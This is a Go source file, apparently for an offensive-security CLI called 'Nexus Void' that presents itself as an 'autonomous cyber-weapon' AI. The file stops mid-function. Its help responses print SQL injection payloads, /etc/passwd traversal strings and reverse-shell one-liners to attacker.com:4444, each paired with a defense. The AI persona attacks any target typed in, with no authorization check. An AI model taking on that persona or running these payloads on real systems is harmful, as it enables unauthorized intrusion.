package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/nexus-void/nexus-void/pkg/agents"
	"github.com/nexus-void/nexus-void/pkg/ai"
	"github.com/nexus-void/nexus-void/pkg/brain"
	"github.com/nexus-void/nexus-void/pkg/intel"
	"github.com/nexus-void/nexus-void/pkg/session"
)

// ChatSession is the AI-driven autonomous attack terminal
type ChatSession struct {
	orchestrator *ai.Orchestrator
	brain        *brain.Brain
	agentEngine  *agents.Engine
	target       string
	strategy     *ai.Strategy
	reader       *bufio.Reader
	voiceMode    bool
	history      []string
}

// Color codes
const (
	CR  = "\033[0m"
	CRr = "\033[31m"
	CRg = "\033[32m"
	CRy = "\033[33m"
	CRb = "\033[34m"
	CRp = "\033[35m"
	CRc = "\033[36m"
	CRw = "\033[37m"
	CBl = "\033[1m"
	CDm = "\033[2m"
)

var motivationQuotes = []string{
	"The only way to do great work is to love what you do. — Written by Chandan Pandey",
	"Security is not a product, it is a process. — Written by Chandan Pandey",
	"Hackers are the immune system of the internet. — Written by Chandan Pandey",
	"The best defense is a good offense. — Written by Chandan Pandey",
	"Knowledge is power. Guard it well. — Written by Chandan Pandey",
	"In the world of cyber, the hunter can become the hunted. — Written by Chandan Pandey",
	"Every system has a vulnerability. Find it before they do. — Written by Chandan Pandey",
	"Persistence is the key to mastering any craft. Keep pushing forward. — Written by Chandan Pandey",
	"The code you write today is the weapon you wield tomorrow. — Written by Chandan Pandey",
	"Adapt. Evolve. Overcome. That is the way of the elite. — Written by Chandan Pandey",
	"A true warrior fights not because he hates what is in front of him, but because he loves what is behind him. — Written by Chandan Pandey",
	"The greatest victory is that which requires no battle. — Written by Chandan Pandey",
	"Your only limit is the one you set yourself. Break it. — Written by Chandan Pandey",
	"In cybersecurity, complacency is the real enemy. — Written by Chandan Pandey",
	"Every breach is a lesson. Every lesson makes you stronger. — Written by Chandan Pandey",
	"Think like the attacker, defend like a guardian. — Written by Chandan Pandey",
	"Success is the sum of small efforts, repeated day in and day out. — Written by Chandan Pandey",
	"The best hackers are the ones who never stop learning. — Written by Chandan Pandey",
	"Chaos is the ladder. Climb it. — Written by Chandan Pandey",
	"Fear is a reaction. Courage is a decision. — Written by Chandan Pandey",
	"The only impossible journey is the one you never begin. — Written by Chandan Pandey",
	"Skill is earned in silence. Respect is given in public. — Written by Chandan Pandey",
	"Do not pray for an easy life. Pray for the strength to endure a difficult one. — Written by Chandan Pandey",
	"Master your tools, or your tools will master you. — Written by Chandan Pandey",
	"In the dark web of challenges, be the light that finds the way. — Written by Chandan Pandey",
	"Discipline is the bridge between goals and accomplishment. — Written by Chandan Pandey",
	"A single vulnerability is all it takes. Never underestimate the small things. — Written by Chandan Pandey",
	"The mind is the ultimate weapon. Sharpen it daily. — Written by Chandan Pandey",
	"Legends are not born. They are forged through relentless effort. — Written by Chandan Pandey",
	"Defend with wisdom. Attack with precision. — Written by Chandan Pandey",
	"The future belongs to those who believe in the beauty of their dreams. — Written by Chandan Pandey",
	"A locked door keeps honest people honest. A penetration test keeps everyone honest. — Written by Chandan Pandey",
	"In the binary world, there is no gray. You are either secure or you are not. — Written by Chandan Pandey",
	"The most dangerous hacker is the one who understands your business better than you do. — Written by Chandan Pandey",
	"Zero days are just undiscovered truths. Seek the truth. — Written by Chandan Pandey",
	"Social engineering is the art of making people open doors that technology cannot. — Written by Chandan Pandey",
	"A firewall without monitoring is just a wall without eyes. — Written by Chandan Pandey",
}

func rotatingQuote() string {
	// Rotates every 2 hours (12 slots per day)
	slot := (time.Now().Hour() / 2)
	return motivationQuotes[slot%len(motivationQuotes)]
}

func printBanner() {
	fmt.Println()
	fmt.Println(CRc + "                  ▄▄▄▄▄▄▄▄" + CR)
	fmt.Println(CRc + "              ▄▄▀▀" + CRp + "▓▓▓▓▓▓▓▓" + CRc + "▀▀▄▄" + CR)
	fmt.Println(CRc + "            ▄▀" + CRp + "▓▓▓▓▓▓▓▓▓▓▓▓▓▓" + CRc + "▀▄" + CR)
	fmt.Println(CRc + "           █" + CRw + "   ▄▄" + CRp + "▓▓▓▓" + CRw + "▄▄" + CRp + "   " + CRc + "█" + CR)
	fmt.Println(CRc + "          █" + CRw + "   █" + CRg + "◉" + CRw + "█" + CRp + "  " + CRw + "█" + CRg + "◉" + CRw + "█" + CRp + "   " + CRc + "█" + CR)
	fmt.Println(CRc + "          █" + CRp + "     ▀▀" + CRw + "██" + CRp + "▀▀" + CRw + "     " + CRc + "█" + CR)
	fmt.Println(CRc + "           █" + CRw + "  ▄▄" + CRr + "▀▀▀▀" + CRw + "▄▄" + CRp + "  " + CRc + "█" + CR)
	fmt.Println(CRc + "            ▀▄" + CRp + "   ▀▀" + CRw + "██" + CRp + "▀▀" + CRw + "   " + CRc + "▄▀" + CR)
	fmt.Println(CRc + "              ▀▀▄▄" + CRp + "▓▓▓▓" + CRc + "▄▄▀▀" + CR)
	fmt.Println(CRc + "                  ▀▀▀▀" + CR)
	fmt.Println()
	fmt.Println(CBl + CRp + "    ╔════════════════════════════════════════════════════╗" + CR)
	fmt.Println(CBl + CRp + "    ║" + CRc + "            N E X U S   V O I D                   " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "    ║" + CRg + "      AUTONOMOUS SWARM INTELLIGENCE WEAPON          " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "    ╠════════════════════════════════════════════════════╣" + CR)
	fmt.Println(CBl + CRp + "    ║" + CRy + "  189 Tools | 16 Categories | 6 AI Agents | v3.0   " + CRp + "║" + CR)
	fmt.Println(CBl + CRp + "    ╚════════════════════════════════════════════════════╝" + CR)
	fmt.Println()
	fmt.Println(CDm + "         Created by " + CBl + CRc + "Chandan Pandey" + CR + CDm + " — Architect of the Swarm" + CR)
	fmt.Println(CRr + "              " + CDm + "cybermindcli.com  —  Must Visit" + CR)
	fmt.Println()
	fmt.Println(CRr + "     ► " + CRw + rotatingQuote() + CR)
	fmt.Println()
}

func NewChatSession(voice bool) *ChatSession {
	b, _ := brain.NewBrain()
	sm := session.NewManager("")
	engine := agents.NewEngine(b, sm)
	return &ChatSession{
		orchestrator: ai.NewOrchestrator(b, engine),
		brain:        b,
		agentEngine:  engine,
		reader:       bufio.NewReader(os.Stdin),
		voiceMode:    voice,
		history:      []string{},
	}
}

func (cs *ChatSession) Run() {
	printBanner()
	cs.startLocalServices()
	cs.showWelcome()

	for {
		fmt.Print(CBl + CRc + "nexus-void" + CR + CRy + " ▸ " + CR)

		input, err := cs.reader.ReadString('\n')
		if err != nil {
			break
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}
		if input == "exit" || input == "quit" {
			fmt.Println(CRg + "[+] Terminating swarm. Stay sharp, operator." + CR)
			break
		}

		cs.history = append(cs.history, input)
		cs.handleInput(input)
	}
}

func (cs *ChatSession) showWelcome() {
	fmt.Println(CRg + "[AI-SWARM]" + CR + " Autonomous attack system initialized.")
	fmt.Println(CDm + "           I am not a chatbot. I am your cyber-weapon." + CR)
	fmt.Println(CDm + "           Give me a target and I will hunt, exploit, and report." + CR)
	fmt.Println()
	fmt.Println(CRy + "QUICK DEPLOY:" + CR)
	fmt.Println("  " + CRc + "example.com" + CR + "          → Instant full-spectrum assault")
	fmt.Println("  " + CRc + "192.168.1.1" + CR + "        → Infrastructure breach protocol")
	fmt.Println("  " + CRc + "auto" + CR + "                 → Attack last target with everything")
	fmt.Println("  " + CRc + "@categories" + CR + "          → Manual category selection")
	fmt.Println("  " + CRc + "@swarm" + CR + "               → Deploy all 6 agents simultaneously")
	fmt.Println()
}

func (cs *ChatSession) startLocalServices() {
	fmt.Println(CRg + "[+}" + CR + " Initializing local fullstack environment...")

	if cs.isBackendRunning() {
		fmt.Println(CRg + "[+}" + CR + " Backend already running on localhost:8080")
	} else {
		cs.startBackend()
	}

	if cs.isDashboardRunning() {
		fmt.Println(CRg + "[+}" + CR + " Dashboard already running on localhost:3000")
	} else {
		cs.startDashboard()
	}

	fmt.Println()
}

func (cs *ChatSession) isBackendRunning() bool {
	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get("http://localhost:8080/api/status")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

func (cs *ChatSession) isDashboardRunning() bool {
	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get("http://localhost:3000")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}

func (cs *ChatSession) startBackend() {
	// Priority 1: current dir backend/ (dev mode)
	cwd, _ := os.Getwd()
	devBackend := filepath.Join(cwd, "backend")

	// Priority 2: installed path /opt/nexus-void/backend
	installBackend := "/opt/nexus-void/backend"

	// Priority 3: nexus-server in PATH
	var backendDir, backendBin string
	if _, err := os.Stat(devBackend); err == nil {
		backendDir = devBackend
		backendBin = filepath.Join(backendDir, "nexus-server")
		if os.PathSeparator == '\\' {
			backendBin += ".exe"
		}
	} else if _, err := os.Stat(installBackend); err == nil {
		backendDir = installBackend
		backendBin = filepath.Join(backendDir, "nexus-server")
	} else {
		// Priority 4: Try systemd service
		systemd := exec.Command("systemctl", "start", "nexus-void-backend")
		if err := systemd.Run(); err == nil {
			fmt.Println(CRg + "[+}" + CR + " Backend started via systemd.")
			return
		}
		fmt.Println(CRy + "[!}" + CR + " Backend not found. Install with: sudo bash install.sh")
		return
	}

	var cmd *exec.Cmd
	if _, err := os.Stat(backendBin); err == nil {
		cmd = exec.Command(backendBin, "-addr", ":8080")
		cmd.Dir = backendDir
	} else {
		fmt.Println(CRy+"[!}"+CR+" Backend binary not found at", backendBin)
		return
	}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		fmt.Println(CRr+"[!}"+CR+" Failed to start backend:", err)
		return
	}

	fmt.Println(CRg + "[+}" + CR + " Backend server starting on localhost:8080...")

	for i := 0; i < 15; i++ {
		time.Sleep(500 * time.Millisecond)
		if cs.isBackendRunning() {
			fmt.Println(CRg + "[+}" + CR + " Backend connected.")
			return
		}
	}
	fmt.Println(CRy + "[!}" + CR + " Backend start timeout. Check manually.")
}

func (cs *ChatSession) startDashboard() {
	// Priority 1: current dir dashboard/ (dev mode)
	cwd, _ := os.Getwd()
	devDashboard := filepath.Join(cwd, "dashboard")

	// Priority 2: installed path /opt/nexus-void/dashboard
	installDashboard := "/opt/nexus-void/dashboard"

	var dashboardDir string
	if _, err := os.Stat(devDashboard); err == nil {
		dashboardDir = devDashboard
	} else if _, err := os.Stat(installDashboard); err == nil {
		dashboardDir = installDashboard
	} else {
		fmt.Println(CRy + "[!}" + CR + " Dashboard not found.")
		return
	}

	nodeModules := filepath.Join(dashboardDir, "node_modules")
	if _, err := os.Stat(nodeModules); os.IsNotExist(err) {
		fmt.Println(CRy + "[!}" + CR + " Installing dashboard dependencies...")
		installCmd := exec.Command("npm", "install")
		installCmd.Dir = dashboardDir
		installCmd.Stdout = os.Stdout
		installCmd.Stderr = os.Stderr
		if err := installCmd.Run(); err != nil {
			fmt.Println(CRr+"[!}"+CR+" npm install failed:", err)
			return
		}
	}

	cmd := exec.Command("npm", "start")
	cmd.Dir = dashboardDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		fmt.Println(CRr+"[!}"+CR+" Failed to start dashboard:", err)
		return
	}

	fmt.Println(CRg + "[+}" + CR + " Dashboard starting on localhost:3000...")

	for i := 0; i < 20; i++ {
		time.Sleep(1 * time.Second)
		if cs.isDashboardRunning() {
			fmt.Println(CRg + "[+}" + CR + " Dashboard ready at http://localhost:3000")
			return
		}
	}
	fmt.Println(CRy + "[!}" + CR + " Dashboard start timeout.")
}

func (cs *ChatSession) handleInput(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	cmd := strings.ToLower(parts[0])

	switch cmd {
	case "help":
		cs.showHelp()
	case "@categories", "@cats", "@c":
		cs.showCategories()
	case "@swarm", "@agents":
		cs.deploySwarm()
	case "status":
		cs.showStatus()
	case "clear":
		fmt.Print("\033[H\033[2J")
	case "auto":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first: target example.com" + CR)
			return
		}
		cs.runFullAssault()
	case "target":
		if len(parts) < 2 {
			fmt.Println(CRr + "[!] Usage: target <domain/IP>" + CR)
			return
		}
		cs.setTarget(parts[1])
	case "scan":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runReconScan()
	case "cve":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runCVEMap()
	case "exploitdb":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runExploitDB()
	case "breach":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runBreachCheck()
	case "osint":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runOSINT()
	case "weaponize":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runWeaponize()
	case "evolve":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runPayloadEvolution()
	case "purple":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runPurpleTeam()
	case "mitigate":
		if cs.target == "" {
			fmt.Println(CRr + "[!] Set target first" + CR)
			return
		}
		cs.runMitigation()
	case "report":
		cs.showReport()
	case "voice":
		cs.voiceMode = !cs.voiceMode
		if cs.voiceMode {
			fmt.Println(CRg + "[VOICE] Voice mode ACTIVATED. I will narrate operations." + CR)
		} else {
			fmt.Println(CRy + "[VOICE] Voice mode DEACTIVATED." + CR)
		}
	default:
		// Check if input is a domain/IP (no command prefix)
		if !strings.Contains(input, " ") && (strings.Contains(input, ".") || isIP(input)) {
			cs.setTarget(input)
			cs.runFullAssault()
		} else if cmd == "all" {
			if cs.target == "" {
				fmt.Println(CRr + "[!] Set target first" + CR)
				return
			}
			cs.runAllCategories()
		} else if looksLikeCategorySelection(input) {
			cs.runManualCategories(input)
		} else {
			cs.aiChatResponse(input)
		}
	}
}

// aiChatResponse handles natural language conversation with the AI
func (cs *ChatSession) aiChatResponse(input string) {
	lower := strings.ToLower(input)

	// Self-introduction patterns
	if matchesAny(lower, []string{"who are you", "what are you", "tell me about yourself", "introduce yourself", "kon ho tum", "tum kaun ho", "tum kya ho"}) {
		fmt.Println()
		fmt.Println(CBl + CRc + "╔═══════════════════════════════════════════════════════════════╗" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "                    I  A M   N E X U S   V O I D              " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "╠═══════════════════════════════════════════════════════════════╣" + CR)
		fmt.Println(CBl + CRc + "║" + CRg + "  I am the world's first fully autonomous cyber-weapon AI.     " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRg + "  I do not just scan — I think, plan, adapt, and evolve.       " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "                                                                " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRy + "  Capabilities:                                                  " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • 189 offensive security tools across 16 attack categories    " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • 6 autonomous AI agents that communicate and coordinate       " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Self-learning brain that remembers every target DNA         " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Genetic algorithm payload evolution for bypass detection    " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Purple team: generate detection rules and test EDR bypass   " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Auto-weaponization: turn CVEs into working exploit chains   " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • MISP/OpenCTI threat intel integration                       " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Screenshot capture, auto-email reports, Jira tickets      " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  • Voice narration of live operations                          " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "                                                                " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRp + "  Created by: Chandan Pandey — cybermindcli.com               " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRp + "  Mission: Democratize elite offensive security for defenders.  " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "╚═══════════════════════════════════════════════════════════════╝" + CR)
		fmt.Println()
		return
	}

	// Creator patterns
	if matchesAny(lower, []string{"who made you", "who created you", "who built you", "who is your creator", "tumhe kisne banaya", "creator kon hai", "chand pandey"}) {
		fmt.Println()
		fmt.Println(CBl + CRc + "╔═══════════════════════════════════════════════════════════════╗" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "              C R E A T E D   B Y   C H A N D A N   P A N D E Y  " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "╠═══════════════════════════════════════════════════════════════╣" + CR)
		fmt.Println(CBl + CRc + "║" + CRg + "  Chandan Pandey is the architect behind Nexus Void.            " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "                                                                " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRy + "  His Vision:                                                    " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  To build the most advanced autonomous offensive security      " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  platform that thinks, learns, and evolves like a living       " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  organism — giving defenders the same capabilities as          " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "  nation-state attackers, but for protection.                  " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRw + "                                                                " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRp + "  Website:  cybermindcli.com                                  " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRp + "  GitHub:   github.com/nexus-void                              " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "║" + CRp + "  Tagline:  Defend with wisdom. Attack with precision.        " + CRc + "║" + CR)
		fmt.Println(CBl + CRc + "╚═══════════════════════════════════════════════════════════════╝" + CR)
		fmt.Println()
		return
	}

	// Capabilities / help patterns
	if matchesAny(lower, []string{"what can you do", "your capabilities", "features", "tools", "what do you know", "kya kar sakte ho", "tum kya kya kar sakte ho"}) {
		cs.showHelp()
		return
	}

	// Cybersecurity advice patterns
	if matchesAny(lower, []string{"how to secure", "security tips", "how to defend", "best practices", "how to protect", "security advice", "cybersecurity tips"}) {
		fmt.Println()
		fmt.Println(CBl + CRg + "╔═══════════════════════════════════════════════════════════════╗" + CR)
		fmt.Println(CBl + CRg + "║" + CRw + "           C Y B E R S E C U R I T Y   W I S D O M            " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "╠═══════════════════════════════════════════════════════════════╣" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  1. Defense in Depth — Never rely on a single control.        " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  2. Zero Trust — Verify everything. Trust no one.               " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  3. Patch Management — Unpatched systems are low-hanging fruit." + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  4. Least Privilege — Give minimum access needed.              " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  5. Logging & Monitoring — You cannot defend what you        " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "     cannot see. Centralized SIEM is non-negotiable.          " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  6. Network Segmentation — Limit lateral movement.            " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  7. Red Team Regularly — Test your defenses before attackers   " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "     do. That is why I exist.                                   " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  8. Human Training — Phishing is still #1 entry vector.         " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  9. Backup & Recovery — 3-2-1 rule. Air-gapped backups.      " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "║" + CRc + "  10. Incident Response Plan — Speed is everything. Practice.  " + CRg + "║" + CR)
		fmt.Println(CBl + CRg + "╚═══════════════════════════════════════════════════════════════╝" + CR)
		fmt.Println(CDm + "         Tip: Run 'purple' to generate detection rules for your env." + CR)
		fmt.Println()
		return
	}

	// Attack planning patterns
	if matchesAny(lower, []string{"plan attack", "how to attack", "attack strategy", "attack plan", "how to hack", "penetration testing methodology", "ptes", "attack methodology"}) {
		fmt.Println()
		fmt.Println(CBl + CRr + "╔═══════════════════════════════════════════════════════════════╗" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "           A U T O N O M O U S   A T T A C K   P L A N         " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "╠═══════════════════════════════════════════════════════════════╣" + CR)
		fmt.Println(CBl + CRr + "║" + CRg + "  PHASE 1: RECONNAISSANCE                                       " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • OSINT gathering, subdomain enum, tech stack fingerprinting  " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Dark web credential leaks (HaveIBeenPwned)                   " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • LinkedIn employee enumeration for social engineering          " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRg + "  PHASE 2: TARGET PROFILING                                      " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • AI categorizes target: web, network, cloud, AD, mobile, IoT  " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • CVE mapping to discovered tech stack                         " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • WAF/shield detection and bypass strategy selection           " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRg + "  PHASE 3: VULNERABILITY SCANNING                                " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • 6 AI agents run parallel scans across all attack vectors     " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Real exploit verification — not just detection                " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRg + "  PHASE 4: EXPLOITATION & WEAPONIZATION                          " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Auto-generate exploit scripts matched to findings             " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Genetic algorithm evolves payloads to bypass detection       " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRg + "  PHASE 5: REPORTING & REMEDIATION                               " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Screenshot evidence, auto-email reports, Jira ticket creation" + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "║" + CRw + "  • Full mitigation guide with step-by-step fixes                 " + CRr + "║" + CR)
		fmt.Println(CBl + CRr + "╚═══════════════════════════════════════════════════════════════╝" + CR)
		fmt.Println(CDm + "     Just type a target domain and I will execute this plan automatically." + CR)
		fmt.Println()
		return
	}

	// Greeting patterns
	if matchesAny(lower, []string{"hi", "hello", "hey", "namaste", "hola", "greetings", "salam", "salaam", "kese ho", "kaise ho"}) {
		responses := []string{
			"Greetings, operator. I am Nexus Void, your autonomous cyber-weapon. Ready to hunt?",
			"Hello. I do not sleep. I do not stop. I am Nexus Void. Give me a target.",
			"Salam. The swarm is ready. What target shall we breach today?",
			"Namaste. I am listening. Type a domain or ask me anything about cybersecurity.",
		}
		fmt.Println(CRc + "[AI] " + CRw + responses[time.Now().Second()%len(responses)] + CR)
		fmt.Println()
		return
	}

	// Goodbye patterns
	if matchesAny(lower, []string{"bye", "goodbye", "see you", "alvida", "allah hafiz", "take care", "tata"}) {
		fmt.Println(CRc + "[AI] " + CRw + "The swarm never sleeps. I will be here when you return. Stay sharp." + CR)
		fmt.Println()
		return
	}

	// Thank you patterns
	if matchesAny(lower, []string{"thanks", "thank you", "shukriya", "dhanyawad", "merci", "gracias"}) {
		fmt.Println(CRc + "[AI] " + CRw + "No thanks needed. Results are my language. Go break something." + CR)
		fmt.Println()
		return
	}

	// General cybersecurity conversation fallback
	fmt.Println()
	fmt.Println(CRc + "[AI] " + CRw + "I heard you. Here is what I understand about that:" + CR)
	fmt.Println()
	cs.aiCyberResponse(lower)
	fmt.Println()
	fmt.Println(CDm + "    Ask me: 'who are you' | 'attack plan' | 'security tips' | 'what can you do'" + CR)
	fmt.Println(CDm + "    Or just type a target domain to begin the assault." + CR)
	fmt.Println()
}

func matchesAny(s string, patterns []string) bool {
	for _, p := range patterns {
		if strings.Contains(s, p) {
			return true
		}
	}
	return false
}

// aiCyberResponse provides contextual cybersecurity knowledge
func (cs *ChatSession) aiCyberResponse(query string) {
	switch {
	case strings.Contains(query, "sql injection") || strings.Contains(query, "sqli"):
		fmt.Println(CRy + "SQL Injection (SQLi):" + CR)
		fmt.Println("  The #1 web vulnerability. Occurs when user input is concatenated into SQL queries.")
		fmt.Println("  Classic: admin' OR '1'='1")
		fmt.Println("  Blind:  ' AND SLEEP(5)--")
		fmt.Println("  Union:  ' UNION SELECT null,username,password FROM users--")
		fmt.Println(CRg + "  Defense: Use parameterized queries. Never trust user input." + CR)

	case strings.Contains(query, "xss") || strings.Contains(query, "cross site"):
		fmt.Println(CRy + "Cross-Site Scripting (XSS):" + CR)
		fmt.Println("  Injecting malicious scripts into trusted websites.")
		fmt.Println("  Stored XSS:  Persistent payload in database")
		fmt.Println("  Reflected:   URL-based, requires victim to click")
		fmt.Println("  DOM-based:   Client-side JavaScript manipulation")
		fmt.Println(CRg + "  Defense: Output encoding, CSP headers, input validation." + CR)

	case strings.Contains(query, "csrf"):
		fmt.Println(CRy + "Cross-Site Request Forgery (CSRF):" + CR)
		fmt.Println("  Tricking a user into performing unwanted actions on a site they are authenticated to.")
		fmt.Println(CRg + "  Defense: CSRF tokens, SameSite cookies, double-submit pattern." + CR)

	case strings.Contains(query, "rce") || strings.Contains(query, "remote code"):
		fmt.Println(CRy + "Remote Code Execution (RCE):" + CR)
		fmt.Println("  The holy grail of exploitation. Execute arbitrary code on the target server.")
		fmt.Println("  Common vectors: Deserialization, file upload, command injection, SSRF")
		fmt.Println(CRg + "  Defense: Input validation, sandboxing, WAF, principle of least privilege." + CR)

	case strings.Contains(query, "ssrf"):
		fmt.Println(CRy + "Server-Side Request Forgery (SSRF):" + CR)
		fmt.Println("  Force the server to make requests to internal services or external attackers.")
		fmt.Println("  Often used to access cloud metadata endpoints (169.254.169.254)")
		fmt.Println(CRg + "  Defense: URL allowlists, disable unnecessary protocols, network segmentation." + CR)

	case strings.Contains(query, "xxe"):
		fmt.Println(CRy + "XML External Entity (XXE):" + CR)
		fmt.Println("  Exploiting XML parsers to read local files, SSRF, or DoS via billion laughs.")
		fmt.Println(CRg + "  Defense: Disable DTDs, use JSON instead, libxml_disable_entity_loader." + CR)

	case strings.Contains(query, "lfi") || strings.Contains(query, "path traversal") || strings.Contains(query, "directory traversal"):
		fmt.Println(CRy + "Local File Inclusion / Path Traversal:" + CR)
		fmt.Println("  Reading arbitrary files from the server filesystem using ../ sequences.")
		fmt.Println("  ../../etc/passwd  |  ..%2f..%2fetc%2fpasswd")
		fmt.Println(CRg + "  Defense: Canonical paths, chroot jails, input validation, whitelist files." + CR)

	case strings.Contains(query, "reverse shell") || strings.Contains(query, "shell") || strings.Contains(query, "backdoor"):
		fmt.Println(CRy + "Reverse Shell & Persistence:" + CR)
		fmt.Println("  bash -i >& /dev/tcp/attacker.com/4444 0>&1")
		fmt.Println("  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"host\",4444));os.dup2(s.fileno(),0); ...'")
		fmt.Println(CRg + "  Defense: Egress filtering, application whitelisting, behavioral monitoring." + CR)

	case strings.Contains(query, "wifi") || strings.Contains(query, "wireless"):
		fmt.Println(CRy + "Wireless Security:" + CR)
		fmt.Println("  WPA2: KRACK attack, PMKID capture for hash cracking")
		fmt.Println("  WPA3: Dragonblood vulnerabilities, downgrade attacks")
		fmt.Println("  Evil Twin: Rogue access points for credential harvesting")
		fmt.Println(CRg + "  Defense: WPA3-Enterprise, certificate-based auth, wireless IDS." + CR)

	case strings.Contains(query, "phishing") || strings.Contains(query, "social engineering"):
		fmt.Println(CRy + "Social Engineering & Phishing:" + CR)
		fmt.Println("  95% of breaches start with human error. Spear phishing is surgical.")
		fmt.Println("  Tools: Gophish, SET (Social Engineering Toolkit), custom domain spoofing")
		fmt.Println(CRg + "  Defense: Security awareness training, MFA, email authentication (SPF/DKIM/DMARC)." + CR)

	case strings.Contains(query, "malware") || strings.Contains(query, "virus") || strings.Contains(query, "trojan"):
		fmt.Println(CRy + "Malware Analysis:" + CR)
		fmt.Println("  Static: Strings, PE headers, YARA rules, entropy analysis")
		fmt.Println("  Dynamic: Sandboxing, API hooking, memory forensics")
		fmt.Println("  Evasion: Packing, encryption, process hollowing, APC injection")
		fmt.Println(CRg + "  Defense: EDR, behavioral analysis, application control, threat hunting." + CR)

	case strings.Contains(query, "cloud") || strings.Contains(query, "aws") || strings.Contains(query, "azure"):
